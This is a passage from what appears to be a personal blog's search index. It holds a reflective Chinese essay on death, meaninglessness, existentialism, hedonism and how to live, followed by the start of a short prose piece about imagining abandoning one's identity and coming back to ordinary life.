今天是2021年大年初一，异地过年有些伤感，时间空闲情绪合适，便想再做一次尝试，尝试在今天写完这份2019年4月初新建的，陆陆续续填充内容但未曾真正结构化的文档，尝试在今天和过去做一个彻底的了断。我要在这里，整理我曾思考和见识过的，关于自由、死亡、孤独与无意义，关于如何生活，关于如何面对自我、他人和这个世界。希望此文成后，我能够全身心投入真实的生活，不再执着存在的意义。\n死亡焦虑 在这一系列主题中，最早引起我注意的是死亡。从大约五六岁开始，一个事实开始浮现：凡人皆有一死。然后一个问题开始困扰：存在有何意义。\n完整的逻辑链是：一个人活着，然后死去，他自己自然是死了，不能再感知或影响这个世界，他对这个世界的任何形式的影响也大概率将随着其他人的死去和时代的变迁而最终了无痕迹。即便有幸留下痕迹，这痕迹本质上也已与他毫无干系，因为当人们提起一个痕迹时，会谈到一个名号，一个故事，而这一切都与那个创造这个痕迹却已经消失的人其实没有半点相关。\n深层的逻辑是：如果一个东西不能永存，那么它没有意义。\n那么如果，如果我能够永生，所得永有，所施永存，那么生活会有什么改变？我会觉得一切有意义吗？我想不会。我所要做的依然是饮食、睡眠、劳动、思考、娱乐，我所享有的依然只有此时此刻，由饮食、排泄、运动、亲密关系、内在的自我肯定、外界的正反馈引起的愉悦不会因为以后还有无数次发生的机会而增强。相反的，所有刺激因反复发生而索然无味，快感阈值不断攀升，有限的人身无法得到无限的满足，一切永存迟早成为困扰，那时厌倦会生起，就会开始考虑自杀。感官享乐在无限中达到极限是显然的，智力满足也是如此。如果有人从秦皇汉武的年代活到今日，他会看见很多故事，但它们的实质并无大不同，厌倦几乎也是必然。对于整个人类社会，人们也许有雄心一同创建一个伟大繁荣的时代，但当个体感到厌倦而结束永存，繁荣于个体也不过是一场春梦。当然，永远有人年轻，为永存而欣喜与为永存而痛苦的故事每天同时发生，这其实和如今的生活无二，每天都有人享受生命和考虑自杀。\n当然，无限的存在意味着无限的可能，在无限可能里是不能有什么论断的。所以总的来说，永生比速死来得有希望，但更大可能还是永存难以被承受。\n所以，永存也不一定能带来什么意义。\n问题要回到意义这个词。说是意义也好，或是目的、作用、价值、最高目标、最重要的东西也罢，到底指的是什么呢？对我来说，我想要的意义应该是一种绝对的意义，一种无视世事变迁的、永恒不变的价值。因为世上没有什么东西有这种意义，所以我举不出例子来。\n虽然不太情愿，但我慢慢承认了。相对的世界里没有绝对的意义，运动的世界里没有不变的价值。\n无神论 有些人相信有更高的主宰，他们赋予人绝对的意义，人应当按照这种意义去生活。这种绝对的意义就像公鸡的意义是打鸣，母鸡的意义是下蛋。无论这些人是发现了真理还是自欺欺人，我都无法成为他们中的一员。即使是作为公鸡母鸡，我确实是要打鸣下蛋的，这也确实是我存在的原因，但我不会喜欢以这种被赋予的意义去过我的生活。打鸣下蛋是我的原因，但不会是我的追求，而阳光草地觅食求偶才可能是活着的动力。\n我只能活在命运之内，并且，在命运之内，我是自由的。所以，我是彻底自由的。在今天，我所唯一相信的命运，就是死亡不可避免。\n存在主义 几乎不可避免地，存在主义在某个阶段进入我的视野。当我看到有人勇敢地宣布“存在先于本质，人生是荒谬的”时，我在沮丧前是为之振奋的。\n发生的就这样发生了，存在的就这样存在了，除了人的生存外，世界是没有意义和任何预定义规则的。道德、灵魂、信仰、习俗不过是一个又一个试图自圆其说的故事，并没有天然的正确性，人也没有任何义务去遵循他们。如果愿意，一切都可以给予意义，但事实而言，没有任何东西能够提供意义。\n也就是说，虚无，就是我们所存在于其中的这个世界的唯一本质，无论这一本质是否被发现、被接受。\n一个人看到并接受了生命荒芜，一切都无意义的真相，走向虚无主义几乎不可避免。但虚无主义这条路走到头也还是黑的，可以称之为没有出路。\n虚无主义者如何自我拯救？自杀自然不可取，那么就只有享乐主义。简言之就是，来都来了。\n其实诚实而言，每一个人类个体所做的一切都是出于对快乐的追求。个体快乐的来源各异，追求的形式也各有不同。如果个体在追求快乐时给其他个体也带来享受更多更大快乐的机会，那么这个人会被认为是好人，其所作所为被认为是好的，这个人也从这种社会评价中获得另一种形式的快乐。反之则逻辑相似，被认为是恶的个体因社会评价甚至社区强制行为而被施加痛苦或剥夺获取更多快乐的机会。\n人类，尤其是持有我国传统观念的，通常倾向于不强调自己的存在是为了快乐。因为资源总量有限，大多数普通人类能够从中获得较大快乐的行为都更可能是侵占他人享乐的机会而非创造更多可被享受的快乐，所以我们的传统文化强调克制节俭，以此鼓励那些省出快乐来同大家共享的个体，排挤那些只顾自己享乐而侵占集体快乐的个体。\n群体不约而同地形成善恶观，个体从出生起就不间断受其浸染，以之为行为准则和思考方式，逐渐在赤裸的生存之上构建起层层叠叠的信条、原则、标准、底线、自我要求、道德评价，以此自我束缚、相互绑架。这种现象是自然而然发生的，是集体环境使然，它使社会趋于并保持稳定，也使个体忘却生命真相徒增莫须有的痛苦。\n几乎所有的道德评价都是这样起作用的。人像是挂在悬崖，连接坚实土地和无尽虚空的是道德这副手铐。因此可说道德是堕落前的底线。但道德是虚构的，所以人的本质是堕落的。没有人能够挣脱这点。另一方面，没有人能够拒绝好的感受。每个人都靠饮、食、男女的快感，他人的理解、认可、尊重，自己的幻想、执念、希望苟延残喘，无一幸免。那么不如拥抱它们。我就是要快乐，如果存在还谈得上有什么目的，也就只有在快感中湮灭了。\n因此我看，诚实的三观应该如此自述，世界是走向虚空的偶然，价值是自欺欺人的幻想，人生是独一无二的盛宴。\n浑身充满快感的存在 幸运而常常未被发现的是，彻底的虚无给予人彻底的自由。因此，时时处处不能忘记，人是自由的，人可以选择。当我们觉得自己没有选择时，实际上说的是这种选择的结果我无法承担或是不愿承担。谨记这一点，虽然面临的处境还是一样，但是思路和心态就会豁朗许多。\n我们可以选择，生命里所有的选择构成了一个人的生活方式。任何选择都是可以的，但为了更好地生存，我们应当，也能够，选择一种适合自己的，自己认为好的生活方式。那么，应当以怎样的标准来选择合适的生活方式呢？\n萨特说：在不存在和这种浑身充满快感的存在之间，是没有中立的。如果我们存在，就必须存在到这样的程度。\n李银河说：用一般的标准来看，激情是存在的上佳状态；用苛刻的标准来看，它是存在的唯一状态。\n李银河还说：自由地去做自己喜欢的事情，自由地去爱自己喜欢的人，自由地选择自己喜欢的生活方式，这就是我的人生宣言。\n这就是说，他们都认为，当意义无法作为选择的准则，人只能依靠欲望，或者说是激情。\n激情比占有更适合用来具体化欲望，激情含有更多的非理性，更普遍存在。人或多或少对某些人或事物能够产生激情，在激发和享受这些激情的过程中，人真正活着。存在的方式应当以创造更多更强烈的激情为原则，这大概便是享乐主义的雏形。\n以上这种思路是危险的，因为一个人认为享乐是人生中最重要的事，又认为道德和风俗是无需顾忌的，那么这个人做坏事而最终变成坏人的可能性是很大的，而在如今，大多数坏事都是要付出代价的。\n很多先哲企图告诉人们，没有信仰是不幸的，是危险的，是可悲的，即便真的如此，对于一个怀疑一切，无所相信的人，信仰如何可能呢？没有信仰顶多自己苦恼，但如果信仰享乐，事情就可能变坏。一个人为了获取更大的快感而不择手段，不计后果，那么这个人离毁灭就不远了。比较典型的故事是电影《金瓶梅》所展示的，所有人追求男女之事的更多的享乐，最终因为有限的人身无法承受无限的极乐而不得善终。这是享乐主义者的人生缩影。如果一个人在享乐主义的道路上走得足够明确，足够坚定，足够聪明，足够快，足够远，那么他很大可能不得善终。\n然而，这对他们并不是什么坏事，因为不得善终只能说明他们把自己的人生理念贯彻得足够好，以至于根本不需要那样长的生命。对他们而言，总的来说，一切是值得的，人生是无悔的。\n但是我们也可以看到，在电影里各主角的死法中，极乐和极苦是并存的，所以他们临终时的心态恐怕难为人所知。\n所以，如果享乐主义是唯一的出路，那么做一个怎样的享乐主义者呢？\n首先需要明确的是，欲望和人的关系有两种，一是欲望驱使人，人成为欲望的奴隶，二是人与欲望共生，在满足欲望的过程中体验存在。这两种关系在客观上并无区别，都表现为人付出努力来满足欲望。它们的差别在于人的主观感受，即人是否能够意识到自己和欲望的关系。\n第二种关系中的欲望一般要较弱，比如吃饭，睡觉，占有和消费。\n欲望本身没有好坏，我们为满足欲望所做的事才可能有所谓的好坏之分。人很难控制住较强的欲望，除非是自毁的，比如搏击俱乐部，比如时间规划局里把时间都给男主的富人，他们是在清醒的毁灭。这是现实中较少见的，是一种极高智慧的自我挣扎和无法妥协。而生命，实际上是接受和妥协。\n我认为奉行享乐第一的人主要有两类，狂风暴雨与细水长流。这是各人自己的选择，我也有自己的一些思考。我倾向于持续获得激情，而非获得更大的激情。因为一方面我本性警惕狂热和极端，另一方面人的局限性导致人在单位时间内所能承受的快感是有限的。所以，对我来说，做一些喜欢做的事情来持续葆有激情，和一些特别的人相处来持续产生愉悦，这就是生活的全部内容。存在的过程没有任何其他更多的意义。生命听起来如此荒凉，但这是真相，且对短暂人生而言也已经足够。当然，一些观念、习俗、道德根深蒂固，哪怕我知道它们并非必要，我并不愿意可能也无法抛弃它们，譬如一些特定的社会责任。\n另外，享受激情是感性的，但追求激情的过程应当是理性的。每一个追求更大激情的人都应该尽可能善良守序，否则就可能无法自控而走向疯狂。那时你就不是一个看清真相而负责任地及时行乐的智者，而是一个不能自已的欲望的客体罢了。\n其实，在虚无之殿的出口，一直还有另一条道路，那就是把激情同贪爱、嗔恨、愚痴等一同归入不净而希望清除掉的佛教。\n空有不二 我在2019年的初秋参加了一个十日内观课程。在十天时间里，保持静默，与任何人没有交谈，避免和任何人的眼神接触和肢体接触，每天只有五件事情，吃饭、散步、睡觉、打坐、听葛印卡的道理同时腹诽。每天十点睡觉，四点起床，打坐十余个小时，现在想起，是一段特别的经历。活动是禁止纸笔记录的，但在看似没有尽头的静默里，度日如年的漫长里，我的思绪实在太多。很遗憾中途违反了规定，写了21张餐巾纸。我想将这些整理出来，称之为“南禅寺妄想录”，但一直迟迟未能真正开始。直到离那时已有一年余的今天，我在时光之流中又飘了许久，许多细节已全然忘记，餐巾纸的扫描件也大多看不明白了。机缘何时再来，暂不可知。\n好的生活方式 上文谈过一些我关于生活方式的看法，但这是值得再细谈的。因为一切关于意义、社会、人性的思考要落到实处就是关乎生活信条和生活方式的选择。\n好的生活方式应该是四点：\n维持存在 更多的愉悦 钝感 简单。因为生命是赤裸裸的，没有什么是必须拥有或遵守的，所以简单几乎是必然结果。重要的是，简单能够释放心力，去关注更在意的。 生活方式和做事方式大多会被归因至人的本性。关于本性，我有一些想法。\n本性可改。见识影响观点和思维，进而决定对人事物的反应模式，以此形成一个人的对内的思维模式和对外的个性特征。所以随着人的认识的增长，其对于世界的理解也在改变，个性是可能随之改变的。 过程困难。不断地怀疑又劝自己相信，不断地推翻又试图建立，直到完全的怀疑和推翻，但又能够任意地相信和建立，这个过程无疑是在毁灭自我，是痛苦不堪的。理想的成果是一个合格的社会工程师，他可以成为任何人，他不相信任何信条但又能让人认为他持有某些观念属于某一类人。他可以是自己，也可以表现成他所观察或想象到的任何有强烈个性或平平无奇的人。他有着最深的孤独，最彻底的怀疑，但他在人类社会游刃有余，并且享受这种可以成为任何人所带来的乐趣。他没有自己的本来面目，他就是权游里的无面者。直到这一刻我才想到，当初只觉得无面者很酷，实际上这是一个智慧而勇敢的人所必然走向的归宿，一个真正理解了人的人。 然而这是痛苦的，这真的是你想要的吗？在这个世界，顽固的清醒者过不上一天好日子，并且也只不过是另一种形式的糊涂者。真正的清醒是不应该有执念的，而应该是玩世不恭和得过且过的。 好的生活方式是成为一个入门级的无面者，享受存在和执念带来的快乐。 其实钝感也就是同时削弱快乐和痛苦的感受。最资深的钝感就是涅槃。 这其实是死局，快乐和痛苦一体两面。没有人能够只快乐而不痛苦。想要不痛苦，要么能力变强，想要的都得到，要么感受变弱，掩耳盗铃。想要快乐，就必须有得到的愿望，有执念，并且有能力满足。 所以人在这个世界的出路有两条，变强，守住执念，于是，不失去自己的愿望，有能力满足愿望。或者就是另一条，抛弃执念，将痛苦和快乐一并剔除，让自己生活在无尽的平静之中，犹如死亡。这就好像，泼洗澡水将孩子一起泼掉，或者说是，因噎废食。我宁愿选择前者。 底色非要悲凉？ 我必须承认第一次在十三邀听马东说这个词时我有拍案叫绝的冲动，并且在之后很长一段时间都认可自己也是底色悲凉的。某天刷牙我忽然觉得这个想法是很搞笑的。和许多其他标签是一样矫情做作的。一个真正的无面者何来底色呢？只要还有底色，就还有执念，就还没真正看破。当然人靠执念活着，看破之后仍然可以选择一些观点生活下去，但这套观点必定是让自己能够过得舒服的。选择悲凉的底色实在不是明智的，更大可能是没有真正选择过。\n当你知道1+1=2之后，你无须在每次进行数学计算时都叹息，1+1何以只等于2，而不能是3、4，甚至更多。所以所谓底色悲凉其实大可不必。既然无意义，那么就专心于乐趣，不必再纠结意义。说底色悲凉，其实还是境界不够，真正能够放下无意义，必须彻底理解、相信、接受，意义不存在，我们也不需要。这之后，就不会再说什么底色悲凉之类伤春悲秋的话了。\n兜兜转转到最后，我觉得还是只有庄子是最透彻的，无所待才能逍遥。\n参考文章 李银河：直面惨淡人生\n李银河：我的人生宣言\n李银河：激情是人生中最可宝贵的\n更重要的，是那些未被列出来的\n闲言语 最终来说，此文并没有像样的结构，只是多个伤感或无聊时刻所闪现的只言片语的堆积，以一种可疑诡异的形态呈现，像一个不知怎么就跑起来了的程序，也像人生中那些仓促上场又匆忙别离的时刻。\n夜深了一天就要结束，这些凌乱思绪在我看来也不那么重要了，也许另一个世界线里，我能找到一个午后，很好地理清所思所想，得出一些像模像样的结论或是原则，但，那又如何呢？\n就这样吧，那些我以为的理解，可能从未发生。而宇宙很大，生活更大，相信日子值得一过。\n","permalink":"https://ret2neo.cn/mind/190403-free-death-lonely-meaningless/","summary":"今天是2021年大年初一，异地过年有些伤感，时间空闲情绪合适，便想再做一次尝试，尝试在今天写完这份2019年4月初新建的，陆陆续续填充内容但未曾真正结构化的文档，尝试在今天和过去做一个彻底的了断。我要在这里，整理我曾思考和见识过的，关于自由、死亡、孤独与无意义，关于如何生活，关于如何面对自我、他人和这个世界。希望此文成后，我能够全身心投入真实的生活，不再执着存在的意义。\n死亡焦虑 在这一系列主题中，最早引起我注意的是死亡。从大约五六岁开始，一个事实开始浮现：凡人皆有一死。然后一个问题开始困扰：存在有何意义。\n完整的逻辑链是：一个人活着，然后死去，他自己自然是死了，不能再感知或影响这个世界，他对这个世界的任何形式的影响也大概率将随着其他人的死去和时代的变迁而最终了无痕迹。即便有幸留下痕迹，这痕迹本质上也已与他毫无干系，因为当人们提起一个痕迹时，会谈到一个名号，一个故事，而这一切都与那个创造这个痕迹却已经消失的人其实没有半点相关。\n深层的逻辑是：如果一个东西不能永存，那么它没有意义。\n那么如果，如果我能够永生，所得永有，所施永存，那么生活会有什么改变？我会觉得一切有意义吗？我想不会。我所要做的依然是饮食、睡眠、劳动、思考、娱乐，我所享有的依然只有此时此刻，由饮食、排泄、运动、亲密关系、内在的自我肯定、外界的正反馈引起的愉悦不会因为以后还有无数次发生的机会而增强。相反的，所有刺激因反复发生而索然无味，快感阈值不断攀升，有限的人身无法得到无限的满足，一切永存迟早成为困扰，那时厌倦会生起，就会开始考虑自杀。感官享乐在无限中达到极限是显然的，智力满足也是如此。如果有人从秦皇汉武的年代活到今日，他会看见很多故事，但它们的实质并无大不同，厌倦几乎也是必然。对于整个人类社会，人们也许有雄心一同创建一个伟大繁荣的时代，但当个体感到厌倦而结束永存，繁荣于个体也不过是一场春梦。当然，永远有人年轻，为永存而欣喜与为永存而痛苦的故事每天同时发生，这其实和如今的生活无二，每天都有人享受生命和考虑自杀。\n当然，无限的存在意味着无限的可能，在无限可能里是不能有什么论断的。所以总的来说，永生比速死来得有希望，但更大可能还是永存难以被承受。\n所以，永存也不一定能带来什么意义。\n问题要回到意义这个词。说是意义也好，或是目的、作用、价值、最高目标、最重要的东西也罢，到底指的是什么呢？对我来说，我想要的意义应该是一种绝对的意义，一种无视世事变迁的、永恒不变的价值。因为世上没有什么东西有这种意义，所以我举不出例子来。\n虽然不太情愿，但我慢慢承认了。相对的世界里没有绝对的意义，运动的世界里没有不变的价值。\n无神论 有些人相信有更高的主宰，他们赋予人绝对的意义，人应当按照这种意义去生活。这种绝对的意义就像公鸡的意义是打鸣，母鸡的意义是下蛋。无论这些人是发现了真理还是自欺欺人，我都无法成为他们中的一员。即使是作为公鸡母鸡，我确实是要打鸣下蛋的，这也确实是我存在的原因，但我不会喜欢以这种被赋予的意义去过我的生活。打鸣下蛋是我的原因，但不会是我的追求，而阳光草地觅食求偶才可能是活着的动力。\n我只能活在命运之内，并且，在命运之内，我是自由的。所以，我是彻底自由的。在今天，我所唯一相信的命运，就是死亡不可避免。\n存在主义 几乎不可避免地，存在主义在某个阶段进入我的视野。当我看到有人勇敢地宣布“存在先于本质，人生是荒谬的”时，我在沮丧前是为之振奋的。\n发生的就这样发生了，存在的就这样存在了，除了人的生存外，世界是没有意义和任何预定义规则的。道德、灵魂、信仰、习俗不过是一个又一个试图自圆其说的故事，并没有天然的正确性，人也没有任何义务去遵循他们。如果愿意，一切都可以给予意义，但事实而言，没有任何东西能够提供意义。\n也就是说，虚无，就是我们所存在于其中的这个世界的唯一本质，无论这一本质是否被发现、被接受。\n一个人看到并接受了生命荒芜，一切都无意义的真相，走向虚无主义几乎不可避免。但虚无主义这条路走到头也还是黑的，可以称之为没有出路。\n虚无主义者如何自我拯救？自杀自然不可取，那么就只有享乐主义。简言之就是，来都来了。\n其实诚实而言，每一个人类个体所做的一切都是出于对快乐的追求。个体快乐的来源各异，追求的形式也各有不同。如果个体在追求快乐时给其他个体也带来享受更多更大快乐的机会，那么这个人会被认为是好人，其所作所为被认为是好的，这个人也从这种社会评价中获得另一种形式的快乐。反之则逻辑相似，被认为是恶的个体因社会评价甚至社区强制行为而被施加痛苦或剥夺获取更多快乐的机会。\n人类，尤其是持有我国传统观念的，通常倾向于不强调自己的存在是为了快乐。因为资源总量有限，大多数普通人类能够从中获得较大快乐的行为都更可能是侵占他人享乐的机会而非创造更多可被享受的快乐，所以我们的传统文化强调克制节俭，以此鼓励那些省出快乐来同大家共享的个体，排挤那些只顾自己享乐而侵占集体快乐的个体。\n群体不约而同地形成善恶观，个体从出生起就不间断受其浸染，以之为行为准则和思考方式，逐渐在赤裸的生存之上构建起层层叠叠的信条、原则、标准、底线、自我要求、道德评价，以此自我束缚、相互绑架。这种现象是自然而然发生的，是集体环境使然，它使社会趋于并保持稳定，也使个体忘却生命真相徒增莫须有的痛苦。\n几乎所有的道德评价都是这样起作用的。人像是挂在悬崖，连接坚实土地和无尽虚空的是道德这副手铐。因此可说道德是堕落前的底线。但道德是虚构的，所以人的本质是堕落的。没有人能够挣脱这点。另一方面，没有人能够拒绝好的感受。每个人都靠饮、食、男女的快感，他人的理解、认可、尊重，自己的幻想、执念、希望苟延残喘，无一幸免。那么不如拥抱它们。我就是要快乐，如果存在还谈得上有什么目的，也就只有在快感中湮灭了。\n因此我看，诚实的三观应该如此自述，世界是走向虚空的偶然，价值是自欺欺人的幻想，人生是独一无二的盛宴。\n浑身充满快感的存在 幸运而常常未被发现的是，彻底的虚无给予人彻底的自由。因此，时时处处不能忘记，人是自由的，人可以选择。当我们觉得自己没有选择时，实际上说的是这种选择的结果我无法承担或是不愿承担。谨记这一点，虽然面临的处境还是一样，但是思路和心态就会豁朗许多。\n我们可以选择，生命里所有的选择构成了一个人的生活方式。任何选择都是可以的，但为了更好地生存，我们应当，也能够，选择一种适合自己的，自己认为好的生活方式。那么，应当以怎样的标准来选择合适的生活方式呢？\n萨特说：在不存在和这种浑身充满快感的存在之间，是没有中立的。如果我们存在，就必须存在到这样的程度。\n李银河说：用一般的标准来看，激情是存在的上佳状态；用苛刻的标准来看，它是存在的唯一状态。\n李银河还说：自由地去做自己喜欢的事情，自由地去爱自己喜欢的人，自由地选择自己喜欢的生活方式，这就是我的人生宣言。\n这就是说，他们都认为，当意义无法作为选择的准则，人只能依靠欲望，或者说是激情。\n激情比占有更适合用来具体化欲望，激情含有更多的非理性，更普遍存在。人或多或少对某些人或事物能够产生激情，在激发和享受这些激情的过程中，人真正活着。存在的方式应当以创造更多更强烈的激情为原则，这大概便是享乐主义的雏形。\n以上这种思路是危险的，因为一个人认为享乐是人生中最重要的事，又认为道德和风俗是无需顾忌的，那么这个人做坏事而最终变成坏人的可能性是很大的，而在如今，大多数坏事都是要付出代价的。\n很多先哲企图告诉人们，没有信仰是不幸的，是危险的，是可悲的，即便真的如此，对于一个怀疑一切，无所相信的人，信仰如何可能呢？没有信仰顶多自己苦恼，但如果信仰享乐，事情就可能变坏。一个人为了获取更大的快感而不择手段，不计后果，那么这个人离毁灭就不远了。比较典型的故事是电影《金瓶梅》所展示的，所有人追求男女之事的更多的享乐，最终因为有限的人身无法承受无限的极乐而不得善终。这是享乐主义者的人生缩影。如果一个人在享乐主义的道路上走得足够明确，足够坚定，足够聪明，足够快，足够远，那么他很大可能不得善终。\n然而，这对他们并不是什么坏事，因为不得善终只能说明他们把自己的人生理念贯彻得足够好，以至于根本不需要那样长的生命。对他们而言，总的来说，一切是值得的，人生是无悔的。\n但是我们也可以看到，在电影里各主角的死法中，极乐和极苦是并存的，所以他们临终时的心态恐怕难为人所知。\n所以，如果享乐主义是唯一的出路，那么做一个怎样的享乐主义者呢？\n首先需要明确的是，欲望和人的关系有两种，一是欲望驱使人，人成为欲望的奴隶，二是人与欲望共生，在满足欲望的过程中体验存在。这两种关系在客观上并无区别，都表现为人付出努力来满足欲望。它们的差别在于人的主观感受，即人是否能够意识到自己和欲望的关系。\n第二种关系中的欲望一般要较弱，比如吃饭，睡觉，占有和消费。\n欲望本身没有好坏，我们为满足欲望所做的事才可能有所谓的好坏之分。人很难控制住较强的欲望，除非是自毁的，比如搏击俱乐部，比如时间规划局里把时间都给男主的富人，他们是在清醒的毁灭。这是现实中较少见的，是一种极高智慧的自我挣扎和无法妥协。而生命，实际上是接受和妥协。\n我认为奉行享乐第一的人主要有两类，狂风暴雨与细水长流。这是各人自己的选择，我也有自己的一些思考。我倾向于持续获得激情，而非获得更大的激情。因为一方面我本性警惕狂热和极端，另一方面人的局限性导致人在单位时间内所能承受的快感是有限的。所以，对我来说，做一些喜欢做的事情来持续葆有激情，和一些特别的人相处来持续产生愉悦，这就是生活的全部内容。存在的过程没有任何其他更多的意义。生命听起来如此荒凉，但这是真相，且对短暂人生而言也已经足够。当然，一些观念、习俗、道德根深蒂固，哪怕我知道它们并非必要，我并不愿意可能也无法抛弃它们，譬如一些特定的社会责任。\n另外，享受激情是感性的，但追求激情的过程应当是理性的。每一个追求更大激情的人都应该尽可能善良守序，否则就可能无法自控而走向疯狂。那时你就不是一个看清真相而负责任地及时行乐的智者，而是一个不能自已的欲望的客体罢了。\n其实，在虚无之殿的出口，一直还有另一条道路，那就是把激情同贪爱、嗔恨、愚痴等一同归入不净而希望清除掉的佛教。\n空有不二 我在2019年的初秋参加了一个十日内观课程。在十天时间里，保持静默，与任何人没有交谈，避免和任何人的眼神接触和肢体接触，每天只有五件事情，吃饭、散步、睡觉、打坐、听葛印卡的道理同时腹诽。每天十点睡觉，四点起床，打坐十余个小时，现在想起，是一段特别的经历。活动是禁止纸笔记录的，但在看似没有尽头的静默里，度日如年的漫长里，我的思绪实在太多。很遗憾中途违反了规定，写了21张餐巾纸。我想将这些整理出来，称之为“南禅寺妄想录”，但一直迟迟未能真正开始。直到离那时已有一年余的今天，我在时光之流中又飘了许久，许多细节已全然忘记，餐巾纸的扫描件也大多看不明白了。机缘何时再来，暂不可知。\n好的生活方式 上文谈过一些我关于生活方式的看法，但这是值得再细谈的。因为一切关于意义、社会、人性的思考要落到实处就是关乎生活信条和生活方式的选择。\n好的生活方式应该是四点：\n维持存在 更多的愉悦 钝感 简单。因为生命是赤裸裸的，没有什么是必须拥有或遵守的，所以简单几乎是必然结果。重要的是，简单能够释放心力，去关注更在意的。 生活方式和做事方式大多会被归因至人的本性。关于本性，我有一些想法。\n本性可改。见识影响观点和思维，进而决定对人事物的反应模式，以此形成一个人的对内的思维模式和对外的个性特征。所以随着人的认识的增长，其对于世界的理解也在改变，个性是可能随之改变的。 过程困难。不断地怀疑又劝自己相信，不断地推翻又试图建立，直到完全的怀疑和推翻，但又能够任意地相信和建立，这个过程无疑是在毁灭自我，是痛苦不堪的。理想的成果是一个合格的社会工程师，他可以成为任何人，他不相信任何信条但又能让人认为他持有某些观念属于某一类人。他可以是自己，也可以表现成他所观察或想象到的任何有强烈个性或平平无奇的人。他有着最深的孤独，最彻底的怀疑，但他在人类社会游刃有余，并且享受这种可以成为任何人所带来的乐趣。他没有自己的本来面目，他就是权游里的无面者。直到这一刻我才想到，当初只觉得无面者很酷，实际上这是一个智慧而勇敢的人所必然走向的归宿，一个真正理解了人的人。 然而这是痛苦的，这真的是你想要的吗？在这个世界，顽固的清醒者过不上一天好日子，并且也只不过是另一种形式的糊涂者。真正的清醒是不应该有执念的，而应该是玩世不恭和得过且过的。 好的生活方式是成为一个入门级的无面者，享受存在和执念带来的快乐。 其实钝感也就是同时削弱快乐和痛苦的感受。最资深的钝感就是涅槃。 这其实是死局，快乐和痛苦一体两面。没有人能够只快乐而不痛苦。想要不痛苦，要么能力变强，想要的都得到，要么感受变弱，掩耳盗铃。想要快乐，就必须有得到的愿望，有执念，并且有能力满足。 所以人在这个世界的出路有两条，变强，守住执念，于是，不失去自己的愿望，有能力满足愿望。或者就是另一条，抛弃执念，将痛苦和快乐一并剔除，让自己生活在无尽的平静之中，犹如死亡。这就好像，泼洗澡水将孩子一起泼掉，或者说是，因噎废食。我宁愿选择前者。 底色非要悲凉？ 我必须承认第一次在十三邀听马东说这个词时我有拍案叫绝的冲动，并且在之后很长一段时间都认可自己也是底色悲凉的。某天刷牙我忽然觉得这个想法是很搞笑的。和许多其他标签是一样矫情做作的。一个真正的无面者何来底色呢？只要还有底色，就还有执念，就还没真正看破。当然人靠执念活着，看破之后仍然可以选择一些观点生活下去，但这套观点必定是让自己能够过得舒服的。选择悲凉的底色实在不是明智的，更大可能是没有真正选择过。\n当你知道1+1=2之后，你无须在每次进行数学计算时都叹息，1+1何以只等于2，而不能是3、4，甚至更多。所以所谓底色悲凉其实大可不必。既然无意义，那么就专心于乐趣，不必再纠结意义。说底色悲凉，其实还是境界不够，真正能够放下无意义，必须彻底理解、相信、接受，意义不存在，我们也不需要。这之后，就不会再说什么底色悲凉之类伤春悲秋的话了。\n兜兜转转到最后，我觉得还是只有庄子是最透彻的，无所待才能逍遥。\n参考文章 李银河：直面惨淡人生\n李银河：我的人生宣言\n李银河：激情是人生中最可宝贵的\n更重要的，是那些未被列出来的","title":"自由、死亡、孤独与无意义"},{"content":"我下班回家，走在路上，我突然想，如果我这么一直走下去，会走到哪里？我会放弃租来的住处，放弃住处里的笔记本、身份证，放弃我的职业，放弃我的公司，放弃我的爱好，放弃我的家人，放弃我的姓名，放弃我的性格，放弃带有“我的”的一切，放弃表情，放弃语言，放弃思索，于是终于，完全放下，自我。我会不再是我，我会是someone，也会是no one。我会变成纯粹的，一个人。\n这个人一直走，从天黑走到天亮，从城市的一头走到另一头，从饥饿走到麻木，从无聊走到疲倦，走过繁华，走过阴森。这个人不愿停下，又已决定不回头，只好一直走。这个人会昏厥。如果在发现前醒来，他会挣扎着继续走，但他走不远。很快意志会被战胜，他又会展现出一如既往的懦弱和颓唐。他停在路边，此时可能已是第二日的黄昏，车水马龙，人来人往，没有人留意角落里的狼狈。他比任何时候都更感到自己和尘世的格格不入，他感到从前的自己太不了解伤感。他随即提醒自己自己已经计划要放弃自我，也就不可再去想起从前了。\n他还是能够感觉到饥饿，但他决定不去解决这个问题，他一早就觉得饮食滋长自我，此刻正是一个考验。他继续走，但走得很慢，脑子也开始迷糊。不知为何，他突然想起悉达多在树下盘起腿来，说是不想明白不起来，又想起年轻的王阳明和同伴在院子里，说是格不动竹不起身。他觉得好笑，忍不住笑了起来，越笑越觉得开心，好久没这样开心。他的笑突然僵住，脚步突然停下。他着急地转身。身后是大卡车呼啸而过。\n他坐在路边，夏夜的晚风有点凉意，路灯的昏黄有些温暖。他又重新注意到行人，有马尾辫，有婴儿车，竟然还有忽闪忽闪的气泡泡。\n所有关于尘世与平凡生活的景象都在呼唤一个在边缘试探的灵魂。他又开始觉得饿了，觉得有些爱这尘土飞扬的人间。\n我在不到24小时里做了好多重大而决绝的决定，但现在一一失败。我能做一些决定，但一些决定我不能做。做了也是徒然。当我失去我，我的决定就变成了风中的决定，只能等着“我”的回来，重新落到我的肩上。\n我又可以开始说我，每一句话都是我开头。我的手机还有电，我还能在路边吃汤面。我打一个的，我喋喋不休地和司机说着什么。我问司机孩子几岁，司机说老婆是高中同桌，我说今天晚上天气很好，司机说前面那姑娘腿真好看。我实在走得太远了，所以行程到一半我和司机已经亲似兄弟，无话不谈。司机问为什么我身上有点臭，我说你知道我吃过的最甜的东西是什么吗，司机说有时候如果不是怕疲劳驾驶根本不想回家，我说其实生活就是无数的选择。我们基本听不见对方说什么，但我们聊得很开心，我们都有充分的自我。我有重生的喜悦，他则跑了一个大长途。下车时我觉得他很舍不得，至少我看见我走了很远他的车还停在路边。我没有不舍的感觉，今天我已经告别太多了，我的感情已经用完。\n我相信失而复得值得高兴，我要为在一场想象中重回的自我庆祝一番，我不会再去做这样的傻事，甚至想也不再想。\n相识的保安问我是不是又没带卡，顺便笑嘻嘻地打开了门，我于是把手从兜里拿出，点头，微笑，谢谢。\n","permalink":"https://ret2neo.cn/mind/190821-airuo/","summary":"我下班回家，走在路上，我突然想，如果我这么一直走下去，会走到哪里？我会放弃租来的住处，放弃住处里的笔记本、身份证，放弃我的职业，放弃我的公司，放弃我的爱好，放弃我的家人，放弃我的姓名，放弃我的性格，放弃带有“我的”的一切，放弃表情，放弃语言，放弃思索，于是终于，完全放下，自我。我会不再是我，我会是someone，也会是no 